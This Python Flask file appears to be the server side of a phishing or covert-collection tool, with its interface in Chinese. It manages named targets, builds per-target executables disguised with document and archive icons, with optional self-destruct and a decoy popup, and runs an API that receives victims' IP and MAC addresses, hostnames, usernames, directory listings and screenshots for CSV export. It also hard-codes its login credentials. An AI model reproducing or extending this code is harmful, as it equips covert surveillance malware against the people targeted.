import os
import json
from functools import wraps
from datetime import datetime
from flask import (
    Blueprint, render_template, request, redirect, url_for, flash,
    send_file, jsonify, current_app, session
)

from .models import (
    init_db, add_target, add_targets_batch, get_all_targets,
    get_target_by_id, get_target_by_token, add_collection,
    get_collections_by_target, get_all_collections, get_stats,
)

# ---- Management Web UI Blueprint ----
routes_web = Blueprint('routes_web', __name__)

# Default credentials
DEFAULT_USERNAME = 'fish'
DEFAULT_PASSWORD = 'fishfish@123'


def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('routes_web.login'))
        return f(*args, **kwargs)
    return decorated


# ---- Login ----

@routes_web.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        if username == DEFAULT_USERNAME and password == DEFAULT_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('routes_web.index'))
        error = '账号或密码错误'
    return render_template('login.html', error=error)


@routes_web.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('routes_web.login'))


# ---- Dashboard ----

@routes_web.route('/')
@login_required
def index():
    stats = get_stats()
    collections = get_all_collections()
    return render_template('index.html', stats=stats, collections=collections)


# ---- Target Management ----

def _exe_filename(target_name, token):
    from .config_manager import build_filename, BIN_EXT
    return build_filename(target_name, token) + BIN_EXT


def _exe_exists(target_name, token):
    from .exe_builder import is_exe_registered
    return is_exe_registered(token)


@routes_web.route('/targets')
@login_required
def targets():
    all_targets = get_all_targets()
    for t in all_targets:
        t['exe_exists'] = _exe_exists(t['name'], t['unique_token'])
    return render_template('targets.html', targets=all_targets)


@routes_web.route('/targets/add', methods=['GET', 'POST'])
@login_required
def add_target_view():
    if request.method == 'POST':
        name = request.form.get('name', '').strip()
        email = request.form.get('email', '').strip()
        department = request.form.get('department', '').strip()

        if not name:
            flash('名称为必填项', 'error')
            return redirect(url_for('routes_web.add_target_view'))

        target_id, token = add_target(name, email, department)
        flash(f'目标已添加 (Token: {token[:8]}...)', 'success')
        return redirect(url_for('routes_web.targets'))

    return render_template('add_target.html')


@routes_web.route('/targets/batch', methods=['GET', 'POST'])
@login_required
def batch_add_targets():
    if request.method == 'POST':
        text = request.form.get('batch_data', '').strip()
        if not text:
            flash('请输入目标数据', 'error')
            return redirect(url_for('routes_web.batch_add_targets'))

        entries = []
        for line in text.split('\n'):
            line = line.strip()
            if not line:
                continue
            parts = [p.strip() for p in line.split(',')]
            if not parts or not parts[0]:
                continue
            name = parts[0]
            email = parts[1] if len(parts) > 1 else ''
            dept = parts[2] if len(parts) > 2 else ''
            entries.append((name, email, dept))

        if not entries:
            flash('未能解析任何有效数据，请检查格式 (姓名,邮箱,部门)', 'error')
            return redirect(url_for('routes_web.batch_add_targets'))

        add_targets_batch(entries)
        flash(f'成功批量添加 {len(entries)} 个目标', 'success')
        return redirect(url_for('routes_web.targets'))

    return render_template('batch_add.html')


@routes_web.route('/targets/<int:target_id>')
@login_required
def target_detail(target_id):
    target = get_target_by_id(target_id)
    if not target:
        flash('目标不存在', 'error')
        return redirect(url_for('routes_web.targets'))
    collections = get_collections_by_target(target_id)
    for c in collections:
        try:
            c['dir_info_parsed'] = json.loads(c['directory_info'])
        except Exception:
            c['dir_info_parsed'] = None
    return render_template('target_detail.html', target=target, collections=collections)


@routes_web.route('/targets/<int:target_id>/delete', methods=['POST'])
@login_required
def delete_target(target_id):
    from .models import get_db
    conn = get_db()
    conn.execute('DELETE FROM collections WHERE target_id = ?', (target_id,))
    conn.execute('DELETE FROM targets WHERE id = ?', (target_id,))
    conn.commit()
    conn.close()
    flash('目标已删除', 'success')
    return redirect(url_for('routes_web.targets'))


@routes_web.route('/targets/<int:target_id>/build_exe', methods=['POST'])
@login_required
def build_exe_from_target(target_id):
    from .exe_builder import build_exe_async

    target = get_target_by_id(target_id)
    if not target:
        return jsonify({'status': 'error', 'message': '目标不存在'}), 404

    listen_url = _get_listen_url()
    build_exe_async(listen_url, target['unique_token'], target['name'], target_id)
    return jsonify({'status': 'ok', 'message': '开始生成'})


@routes_web.route('/build_status_all')
@login_required
def build_status_all():
    from .exe_builder import get_all_build_status
    return jsonify(get_all_build_status())


@routes_web.route('/targets/<int:target_id>/download_exe')
@login_required
def download_exe_from_target(target_id):
    target = get_target_by_id(target_id)
    if not target:
        flash('目标不存在', 'error')
        return redirect(url_for('routes_web.targets'))

    filename = _exe_filename(target['name'], target['unique_token'])
    from .exe_builder import OUTPUT_DIR
    filepath = os.path.join(OUTPUT_DIR, filename)
    if not os.path.exists(filepath):
        flash('EXE文件不存在，请先生成', 'error')
        return redirect(url_for('routes_web.targets'))

    return send_file(filepath, as_attachment=True, download_name=filename)


@routes_web.route('/targets/<int:target_id>/delete_exe', methods=['POST'])
@login_required
def delete_exe_from_target(target_id):
    target = get_target_by_id(target_id)
    if not target:
        flash('目标不存在', 'error')
        return redirect(url_for('routes_web.targets'))

    filename = _exe_filename(target['name'], target['unique_token'])
    from .exe_builder import OUTPUT_DIR, unregister_exe
    filepath = os.path.join(OUTPUT_DIR, filename)
    if os.path.exists(filepath):
        os.remove(filepath)
    unregister_exe(target['unique_token'])
    flash('EXE已删除', 'success')

    return redirect(url_for('routes_web.targets'))


@routes_web.route('/targets/delete_all_exe', methods=['POST'])
@login_required
def delete_all_exe():
    from .exe_builder import OUTPUT_DIR, clear_exe_registry, BIN_EXT
    count = 0
    if os.path.exists(OUTPUT_DIR):
        for f in os.listdir(OUTPUT_DIR):
            if f.endswith(BIN_EXT):
                os.remove(os.path.join(OUTPUT_DIR, f))
                count += 1
    clear_exe_registry()
    flash(f'已清除 {count} 个文件', 'success')
    return redirect(url_for('routes_web.targets'))


@routes_web.route('/targets/batch_delete', methods=['POST'])
@login_required
def batch_delete_targets():
    from .models import get_db
    ids = request.form.getlist('ids[]')
    if ids:
        conn = get_db()
        id_list = [int(i) for i in ids]
        placeholders = ','.join('?' for _ in id_list)
        conn.execute(f'DELETE FROM collections WHERE target_id IN ({placeholders})', id_list)
        conn.execute(f'DELETE FROM targets WHERE id IN ({placeholders})', id_list)
        conn.commit()
        conn.close()
        flash(f'已删除 {len(ids)} 个目标', 'success')
    return redirect(url_for('routes_web.targets'))


@routes_web.route('/targets/batch_build_exe', methods=['POST'])
@login_required
def batch_build_exe_targets():
    from .exe_builder import build_exe_async
    ids = request.form.getlist('ids[]')
    listen_url = _get_listen_url()
    count = 0
    for tid in ids:
        target = get_target_by_id(int(tid))
        if target:
            build_exe_async(listen_url, target['unique_token'], target['name'], target['id'])
            count += 1
    return jsonify({'status': 'ok', 'message': f'已开始生成 {count} 个EXE'})


# ---- EXE Generation ----


def _get_listen_url():
    """Get the listen URL from app config for embedding in EXEs."""
    host = current_app.config.get('LISTEN_HOST', '127.0.0.1')
    port = current_app.config.get('LISTEN_PORT', 8080)
    return f'http://{host}:{port}'


@routes_web.route('/exe/build_base', methods=['POST'])
@login_required
def build_base():
    from .exe_builder import build_base_exe, BASE_EXE_PATH
    try:
        path = build_base_exe()
        flash(f'基础EXE构建成功: {os.path.basename(path)}', 'success')
    except Exception as e:
        flash(f'构建失败: {e}', 'error')
    return redirect(url_for('routes_web.exe_generate'))


@routes_web.route('/exe/generate')
@login_required
def exe_generate():
    from .exe_builder import OUTPUT_DIR, BIN_EXT, BASE_EXE_PATH
    all_targets = get_all_targets()
    files = []
    if os.path.exists(OUTPUT_DIR):
        files = sorted(
            [f for f in os.listdir(OUTPUT_DIR) if f.endswith(BIN_EXT)],
            key=lambda f: os.path.getmtime(os.path.join(OUTPUT_DIR, f)),
            reverse=True
        )
    has_base_exe = os.path.exists(BASE_EXE_PATH)
    return render_template('exe_generate.html', targets=all_targets, files=files,
                           has_base_exe=has_base_exe)


@routes_web.route('/exe/generate/<int:target_id>', methods=['POST'])
@login_required
def build_single_exe(target_id):
    from .exe_builder import build_exe

    target = get_target_by_id(target_id)
    if not target:
        flash('目标不存在', 'error')
        return redirect(url_for('routes_web.exe_generate'))

    listen_url = _get_listen_url()

    try:
        exe_path = build_exe(listen_url, target['unique_token'], target['name'])
        flash(f'EXE生成成功: {os.path.basename(exe_path)}', 'success')
    except Exception as e:
        flash(f'EXE生成失败: {e}', 'error')

    return redirect(url_for('routes_web.exe_generate'))


@routes_web.route('/exe/generate/batch', methods=['POST'])
@login_required
def build_batch_exes():
    from .exe_builder import build_exes_batch

    target_ids = request.form.getlist('target_ids')
    if not target_ids:
        flash('请选择至少一个目标', 'error')
        return redirect(url_for('routes_web.exe_generate'))

    targets = []
    for tid in target_ids:
        t = get_target_by_id(int(tid))
        if t:
            targets.append({
                'id': t['id'],
                'name': t['name'],
                'token': t['unique_token'],
            })

    listen_url = _get_listen_url()
    results = build_exes_batch(listen_url, targets)

    success_count = sum(1 for r in results if r['success'])
    fail_count = len(results) - success_count
    flash(f'批量生成完成: 成功 {success_count} 个, 失败 {fail_count} 个', 'success')
    return redirect(url_for('routes_web.exe_generate'))


@routes_web.route('/exe/download/<path:filename>')
@login_required
def download_exe(filename):
    from .exe_builder import OUTPUT_DIR
    filepath = os.path.join(OUTPUT_DIR, filename)
    if not os.path.exists(filepath):
        flash('文件不存在', 'error')
        return redirect(url_for('routes_web.exe_generate'))
    return send_file(filepath, as_attachment=True, download_name=filename)


# ---- Collections ----


@routes_web.route('/collections')
@login_required
def collections():
    all_collections = get_all_collections()
    return render_template('collections.html', collections=all_collections)


@routes_web.route('/collections/<int:col_id>/delete', methods=['POST'])
@login_required
def delete_single_collection(col_id):
    from .models import delete_collection
    delete_collection(col_id)
    flash('已删除', 'success')
    return redirect(url_for('routes_web.collections'))


@routes_web.route('/collections/batch_delete', methods=['POST'])
@login_required
def batch_delete_collections():
    from .models import delete_collections_batch
    ids = request.form.getlist('ids[]')
    if ids:
        delete_collections_batch([int(i) for i in ids])
        flash(f'已删除 {len(ids)} 条记录', 'success')
    return redirect(url_for('routes_web.collections'))


@routes_web.route('/collections/export')
@login_required
def export_collections():
    import csv
    import io as io_mod
    ids = request.args.getlist('ids[]')
    if ids:
        all_data = get_all_collections()
        id_set = set(int(i) for i in ids)
        rows = [r for r in all_data if r['id'] in id_set]
    else:
        rows = get_all_collections()

    output = io_mod.StringIO()
    writer = csv.writer(output)
    writer.writerow(['ID', '目标姓名', '邮箱', '部门', 'IP/MAC地址', '出口IP',
                      'MAC地址原始数据', '主机名', '用户名', '截屏文件', '目录信息', '回传时间'])
    for r in rows:
        writer.writerow([
            r['id'], r.get('target_name', ''), r.get('target_email', ''),
            r.get('target_department', ''), r['ip_address'], r.get('exit_ip', ''),
            r['mac_address'], r['hostname'], r['username'], r['screenshot_path'],
            r['directory_info'], r['received_at'],
        ])

    output.seek(0)
    from flask import Response
    return Response(
        output.getvalue().encode('utf-8-sig'),
        mimetype='text/csv',
        headers={'Content-Disposition': 'attachment; filename=collections_export.csv'}
    )


@routes_web.route('/uploads/<path:filename>')
@login_required
def uploaded_file(filename):
    uploads_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'uploads')
    return send_file(os.path.join(uploads_dir, filename))


@routes_web.route('/icons/<path:filename>')
@login_required
def icon_file(filename):
    icons_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'output', 'icons')
    return send_file(os.path.join(icons_dir, filename))


# ---- EXE Config ----


@routes_web.route('/exe/config', methods=['GET', 'POST'])
@login_required
def exe_config():
    from .config_manager import load_config, save_config, save_icon, ICONS_DIR

    if request.method == 'POST':
        # Handle preset icon selection
        preset = request.form.get('select_preset', '')
        if preset:
            preset_path = os.path.join(ICONS_DIR, preset)
            if os.path.exists(preset_path):
                config = load_config()
                config['icon_path'] = preset_path
                save_config(config)
                flash(f'已选择图标: {preset}', 'success')
                return redirect(url_for('routes_web.exe_config'))

        # Handle custom icon upload
        if 'icon_file' in request.files:
            icon_file = request.files['icon_file']
            if icon_file and icon_file.filename:
                if not icon_file.filename.lower().endswith('.ico'):
                    flash('仅支持 .ico 格式的图标文件', 'error')
                else:
                    save_icon(icon_file)
                    flash('图标已更新', 'success')

        # Handle name template config
        save_template = request.form.get('save_template', '')
        if save_template:
            name_template = request.form.get('name_template', '').strip()
            if name_template:
                config = load_config()
                config['name_template'] = name_template
                save_config(config)
                flash('名称模板已保存', 'success')

        # Handle behavior settings (separate form)
        if request.form.get('save_behavior'):
            config = load_config()
            config['self_destruct'] = request.form.get('self_destruct') == 'on'
            config['popup_enabled'] = request.form.get('popup_enabled') == 'on'
            # Only update message if the field was actually submitted (not disabled)
            if 'popup_message' in request.form:
                config['popup_message'] = request.form.get('popup_message', '').strip()
            save_config(config)
            flash('行为设置已保存', 'success')

        return redirect(url_for('routes_web.exe_config'))

    # Generate built-in icons if not exist
    try:
        from .icon_extractor import generate_builtin_icons
        icons_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'output', 'icons')
        builtin = ['xlsx.ico', 'docx.ico', 'zip.ico', 'pdf.ico']
        if not all(os.path.exists(os.path.join(icons_dir, f)) for f in builtin):
            generate_builtin_icons()
    except Exception:
        pass

    # List available preset icons
    presets = []
    icons_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'output', 'icons')
    if os.path.exists(icons_dir):
        for f in os.listdir(icons_dir):
            if f.endswith('.ico'):
                presets.append(f)

    config = load_config()
    preview = config['name_template'].replace('{name}', '张三').replace('{token8}', 'a1b2c3d4').replace('{token}', 'a1b2c3d4-xxxx-xxxx-xxxx-xxxxxxxxxxxx')
    return render_template('exe_config.html', config=config, preview=preview, presets=presets)


# ---- API Blueprint (data collection endpoint) ----
routes_api = Blueprint('routes_api', __name__)


@routes_api.route('/api/collect', methods=['POST'])
def api_collect():
    token = request.form.get('token', '')
    if not token:
        return jsonify({'status': 'error', 'message': 'missing token'}), 400

    target = get_target_by_token(token)
    if not target:
        return jsonify({'status': 'error', 'message': 'invalid token'}), 404

    ip_address = request.form.get('ip_address', '')
    mac_address = request.form.get('mac_address', '')
    hostname = request.form.get('hostname', '')
    username = request.form.get('username', '')
    directory_info = request.form.get('directory_info', '{}')

    screenshot_path = ''
    screenshot_file = request.files.get('screenshot')
    if screenshot_file and screenshot_file.filename:
        uploads_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'uploads')
        os.makedirs(uploads_dir, exist_ok=True)

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"screenshot_{target['id']}_{timestamp}.jpg"
        filepath = os.path.join(uploads_dir, filename)
        screenshot_file.save(filepath)
        screenshot_path = filename

    exit_ip = request.remote_addr or ''
    add_collection(
        target['id'], ip_address, mac_address, hostname, username,
        screenshot_path, directory_info, exit_ip
    )

    return jsonify({'status': 'ok', 'message': 'data received'}), 200
